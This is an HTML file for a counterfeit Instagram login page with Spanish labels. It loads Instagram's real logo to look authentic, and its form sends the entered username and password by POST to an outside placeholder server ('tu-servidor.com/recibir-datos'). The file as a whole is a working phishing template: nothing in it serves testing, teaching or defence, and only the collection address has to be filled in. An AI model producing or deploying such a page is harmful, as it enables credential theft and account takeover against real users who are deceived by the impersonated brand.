<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #fafafa; }
        .container { width: 350px; margin: 0 auto; padding: 20px; background: #fff; border: 1px solid #dbdbdb; }
        .logo { text-align: center; margin-bottom: 20px; }
        .logo img { width: 175px; }
        .form-group { margin-bottom: 15px; }
        .form-group label { display: block; margin-bottom: 5px; }
        .form-group input { width: 100%; padding: 8px; box-sizing: border-box; }
        .login-btn { width: 100%; padding: 10px; background-color: #3897f0; color: #fff; border: none; cursor: pointer; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" alt="Instagram">
        </div>
        <form action="https://tu-servidor.com/recibir-datos" method="post">
            <div class="form-group">
                <label for="username">Nombre de usuario</label>
                <input type="text" id="username" name="username" required>
            </div>
            <div class="form-group">
                <label for="password">Contraseña</label>
                <input type="password" id="password" name="password" required>
            </div>
            <button type="submit" class="login-btn">Iniciar sesión</button>
        </form>
    </div>
</body>
</html>
